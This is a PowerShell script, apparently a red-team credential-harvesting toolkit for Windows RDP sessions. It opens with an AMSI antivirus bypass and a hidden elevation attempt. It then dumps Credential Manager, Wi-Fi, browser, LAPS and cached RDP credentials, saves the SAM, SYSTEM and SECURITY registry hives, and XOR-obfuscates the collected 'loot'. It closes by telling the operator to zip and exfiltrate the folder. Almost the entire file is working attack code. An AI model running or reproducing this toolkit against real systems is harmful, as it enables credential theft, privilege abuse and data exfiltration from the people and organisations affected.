[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

function Invoke-PrivilegeEscalation {
    if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
        try {
            Start-Process powershell.exe -ArgumentList "-WindowStyle Hidden -File `"$PSCommandPath`"" -Verb RunAs -ErrorAction SilentlyContinue
            Exit
        } catch {}
    } else {
        $host.UI.RawUI.WindowTitle = "Credential Enumeration - Administrator RDP Session"
    }
}

function xor-encode {
    param (
        [string]$Path,
        [byte]$Key = 0x42
    )
    if (-not (Test-Path $Path)) { return }
    $bytes = [System.IO.File]::ReadAllBytes($Path)
    for($i = 0; $i -lt $bytes.Length; $i++) {
        $bytes[$i] = $bytes[$i] -bxor $Key
    }
    [Convert]::ToBase64String($bytes) | Out-File "$Path.xor64" -Encoding ascii
    Remove-Item $Path -Force -ErrorAction SilentlyContinue
}

function Func-CredManager {
    Write-Host "[1] Enumerating Windows Credential Manager..." -ForegroundColor Yellow
    try {
        [void][Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]
        $vault = New-Object Windows.Security.Credentials.PasswordVault
        $creds = $vault.RetrieveAll()
        $creds | ForEach-Object {
            try { $_.RetrievePassword() } catch {}
            $_ | Select-Object Resource, UserName, Password | Export-Csv -Path "$outputDir\credman_all.csv" -Append -NoTypeInformation -Encoding utf8
        }
        if (Test-Path "$outputDir\credman_all.csv") {
            Write-Host "[+] Saved → credman_all.csv" -ForegroundColor Green
        }
    } catch {}
}

function Func-CmdKey {
    Write-Host "[2] Dumping cmdkey..." -ForegroundColor Yellow
    cmdkey /list | Out-File -FilePath "$outputDir\cmdkey_list.txt" -Encoding ascii
    if (Test-Path "$outputDir\cmdkey_list.txt") {
        Write-Host "[+] Saved → cmdkey_list.txt" -ForegroundColor Green
    }
}

function Func-WiFi {
    Write-Host "[3] Extracting WiFi Passwords..." -ForegroundColor Yellow
    $wifiOut = "$outputDir\wifi_passwords.csv"
    (netsh wlan show profiles) | Select-String "\:(.+)$" | ForEach-Object {
        $name = $_.Matches.Groups[1].Value.Trim()
        $key = (netsh wlan show profile name="$name" key=clear) | Select-String "Key Content\W+\:(.+)$"
        if ($key) {
            [PSCustomObject]@{
                Profile = $name
                Password = $key.Matches.Groups[1].Value.Trim()
            } | Export-Csv $wifiOut -Append -NoTypeInformation
        }
    }
    if (Test-Path $wifiOut) {
        Write-Host "[+] Saved → wifi_passwords.csv" -ForegroundColor Green
    }
}

function Func-RDP {
    Write-Host "[4] Hunting RDP Credentials..." -ForegroundColor Yellow
    Get-ChildItem -Path "$env:APPDATA\Microsoft\Credentials", "$env:LOCALAPPDATA\Microsoft\Credentials" -Recurse -File -ErrorAction SilentlyContinue |
        Select FullName, Length, LastWriteTime |
        Export-Csv "$outputDir\cred_blobs.csv" -NoTypeInformation
    reg query "HKCU\Software\Microsoft\Terminal Server Client\Servers" /s 2>$null | Out-File "$outputDir\rdp_servers.reg.txt"
    Write-Host "[+] Saved → cred_blobs.csv & rdp_servers.reg.txt" -ForegroundColor Green
}

function Func-Browsers {
    Write-Host "[5] Dumping Browser Passwords locations..." -ForegroundColor Yellow
    $browsers = @(
        @{Name="Chrome";  Path="$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"},
        @{Name="Edge";    Path="$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Login Data"},
        @{Name="Firefox"; Path=(Get-ChildItem "$env:APPDATA\Mozilla\Firefox\Profiles" -Directory -ErrorAction SilentlyContinue | Select -Last 1 -Expand FullName) + "\logins.json"}
    )
    foreach ($b in $browsers) {
        if (Test-Path $b.Path) {
            $dest = "$outputDir\$($b.Name)_creds"
            if ($b.Name -eq "Firefox") {
                Copy-Item $b.Path "$dest.json" -Force
                Write-Host "[+] $($b.Name) → $($b.Name)_creds.json" -ForegroundColor Green
            } else {
                Copy-Item $b.Path "$dest.sqlite" -Force
                Write-Host "[+] $($b.Name) → $($b.Name)_creds.sqlite" -ForegroundColor Green
            }
        }
    }
}

function Func-LAPS {
    Write-Host "[6] Checking LAPS..." -ForegroundColor Yellow
    try {
        Get-ADComputer $env:COMPUTERNAME -Properties ms-Mcs-AdmPwd -ErrorAction Stop |
            Select -Expand ms-Mcs-AdmPwd |
            Out-File "$outputDir\laps.txt"
        if (Test-Path "$outputDir\laps.txt") {
            Write-Host "[!] LAPS password found → laps.txt" -ForegroundColor Red
        }
    } catch {}
}

function Func-IE {
    Write-Host "[7] IE/Legacy Edge Passwords..." -ForegroundColor Yellow
    reg query "HKCU\Software\Microsoft\Internet Explorer\IntelliForms\Storage2" /s 2>$null | Out-File "$outputDir\ie_intelliforms.reg.txt"
    if (Test-Path "$outputDir\ie_intelliforms.reg.txt") {
        Write-Host "[+] Saved → ie_intelliforms.reg.txt" -ForegroundColor Green
    }
}

function Func-Unattended {
    Write-Host "[8] Unattended/Sysprep Files..." -ForegroundColor Yellow
    Get-ChildItem -Path "$env:SystemDrive\","C:\Windows\Panther","C:\Windows\System32\sysprep" -Recurse -Include *.xml,*.txt,unattend*,sysprep* -ErrorAction SilentlyContinue |
        Where-Object { $_.Length -lt 1MB } |
        ForEach-Object {
            Copy-Item $_.FullName "$outputDir\unattend_$($_.Name)" -Force
            Write-Host "[+] Copied → unattend_$($_.Name)" -ForegroundColor DarkGreen
        }
}

function Func-Recent {
    Write-Host "[9] Recent Activity..." -ForegroundColor Yellow
    Get-ChildItem "$env:APPDATA\Microsoft\Windows\Recent" -Recurse -ErrorAction SilentlyContinue |
        Select FullName, LastWriteTime |
        Export-Csv "$outputDir\recent.csv" -NoTypeInformation
    reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" /s 2>$null | Out-File "$outputDir\runmru.txt"
    Copy-Item "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt" "$outputDir\ps_history.txt" -ErrorAction SilentlyContinue
    Write-Host "[+] Saved → recent.csv, runmru.txt, ps_history.txt" -ForegroundColor Green
}

function Func-Hives {
    Write-Host "[10] SAM/SYSTEM/SECURITY Hives..." -ForegroundColor Yellow
    reg save HKLM\SAM     "$outputDir\SAM"     2>$null
    reg save HKLM\SYSTEM  "$outputDir\SYSTEM"  2>$null
    reg save HKLM\SECURITY "$outputDir\SECURITY" 2>$null
    if (Test-Path "$outputDir\SAM") {
        Write-Host "[!] Registry hives saved → SAM, SYSTEM, SECURITY" -ForegroundColor Red
    }
}

function Show-Menu {
    Clear-Host
    Write-Host @"
╔═══════════════════════════════════════════════════════════════════════════╗
║          RDP Credential Enumeration Toolkit - 2026                        ║
║                        Pwned Labs | @maverickx64                          ║
╚═══════════════════════════════════════════════════════════════════════════╝
"@ -ForegroundColor Cyan

    Write-Host "Select an option:" -ForegroundColor Yellow
    Write-Host "1. Windows Credential Manager"
    Write-Host "2. cmdkey / network credentials"
    Write-Host "3. WiFi Passwords"
    Write-Host "4. RDP Credentials"
    Write-Host "5. Browser Passwords"
    Write-Host "6. LAPS Password"
    Write-Host "7. IE/Legacy Edge Passwords"
    Write-Host "8. Unattended/Sysprep Files"
    Write-Host "9. Recent Activity & PS History"
    Write-Host "10. SAM/SYSTEM/SECURITY Hives"
    Write-Host "A. Run All"
    Write-Host "E. Encode all loot (XOR+Base64)"
    Write-Host "0. Exit"

    $choice = Read-Host "Enter choice"
    return $choice
}

$outputDir = "$env:USERPROFILE\Desktop\Loot_$(Get-Date -Format 'yyyy-MM-dd_HHmm')"
New-Item -ItemType Directory -Path $outputDir -Force | Out-Null
Write-Host "[+] Loot directory: $outputDir`n" -ForegroundColor Green

Invoke-PrivilegeEscalation

do {
    $choice = Show-Menu
    switch ($choice.ToUpper()) {
        '1'  { Func-CredManager }
        '2'  { Func-CmdKey }
        '3'  { Func-WiFi }
        '4'  { Func-RDP }
        '5'  { Func-Browsers }
        '6'  { Func-LAPS }
        '7'  { Func-IE }
        '8'  { Func-Unattended }
        '9'  { Func-Recent }
        '10' { Func-Hives }
        'A'  {
            Func-CredManager
            Func-CmdKey
            Func-WiFi
            Func-RDP
            Func-Browsers
            Func-LAPS
            Func-IE
            Func-Unattended
            Func-Recent
            Func-Hives
            Write-Host "`nEnumeration Complete!" -ForegroundColor Cyan
        }
        'E'  {
            Write-Host "Encoding all files in loot folder..." -ForegroundColor Magenta
            Get-ChildItem $outputDir -File | ForEach-Object {
                xor-encode $_.FullName
            }
            Write-Host "[+] All files encoded to .xor64 and originals removed" -ForegroundColor Magenta
        }
        '0'  { break }
    }

    if ($choice -ne '0') {
        Write-Host "`nPress any key to continue..." -ForegroundColor Magenta
        $null = $host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
    }
} while ($choice -ne '0')

Write-Host @"
Finished.

All files are saved in plain text format in:
$outputDir

Optional: Type 'E' in the menu to XOR-encode + Base64 all files (creates .xor64 copies and deletes originals)

Decode example (if encoded):
`$bytes = [Convert]::FromBase64String((Get-Content file.xor64 -Raw))
for(`$i=0; `$i -lt `$bytes.Length; `$i++) { `$bytes[`$i] = `$bytes[`$i] -bxor 0x42 }
`$bytes | Set-Content -Path decoded.bin -Encoding Byte`

Zip the folder and exfiltrate.
Pwned Labs | @maverickx64
"@ -ForegroundColor Cyan
